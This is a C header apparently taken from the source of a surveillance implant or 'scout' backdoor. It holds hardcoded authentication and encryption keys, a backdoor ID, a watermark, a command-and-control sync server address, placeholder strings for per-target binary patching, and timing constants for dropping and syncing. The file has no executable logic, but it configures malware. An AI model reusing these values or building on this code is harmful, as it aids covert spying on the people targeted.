#ifndef _BINPATCHED_H
#define _BINPATCHED_H

#define KEY_LEN 16

#ifdef _DEBUG_BINPATCH // istanza 'poveri' su castore.
#define CLIENT_KEY			"4yeN5zu0+il3Jtcb5a1sBcAdjYFcsD9z"	// per server (auth)
#define ENCRYPTION_KEY		"i6gMR84bxvQovzbhtV-if0SdPMu359ax"	// for log
#define ENCRYPTION_KEY_CONF "uX-o0BOIkiyOyVXH4L3FYhbai-CvMU-_"	// for conf e sha12
#define BACKDOOR_ID			"RCS_0000001167"					// castore "poveri"
#define DEMO_TAG			"hxVtdxJ/Z8LvK3ULSnKRUmLE"
#define WMARKER				"B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"
#define SYNC_SERVER			"192.168.100.100"
#define SCOUT_NAME			"pippopippo"
#define SCREENSHOT_FLAG		"\x00\x00\x00\x00"
#else
#define CLIENT_KEY			"ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ"
#define ENCRYPTION_KEY		"WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg"
#define ENCRYPTION_KEY_CONF	"6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY"
#define BACKDOOR_ID			"EMp7Ca7-fpOBIr"
#define DEMO_TAG			"Pg-WaVyPzMMMMmGbhP6qAigT"
#define WMARKER				"B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW" // watermark
#define SYNC_SERVER			"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
#define SCOUT_NAME			"SCOUTSCOUTSCOUTSCOUT"
#define SCREENSHOT_FLAG		"SHOT"
#endif


#ifdef _DEBUG
	#define WAIT_DROP			1500
	#define WAIT_SUCCESS_SYNC	12000
	#define WAIT_FAIL_SYNC		10000
	#define WAIT_INPUT			5000
#else
	#ifdef _DEBUG_WAIT
		#define WAIT_DROP			1500
		#define WAIT_SUCCESS_SYNC	10000
		#define WAIT_FAIL_SYNC		10000
		#define WAIT_INPUT			3000
	#else
		#define WAIT_DROP			15000
		#define WAIT_SUCCESS_SYNC	1200000
		#define WAIT_FAIL_SYNC		300000
		#define WAIT_INPUT			300000
	#endif // _DEBUG_WAIT
#endif // _DEBUG


#endif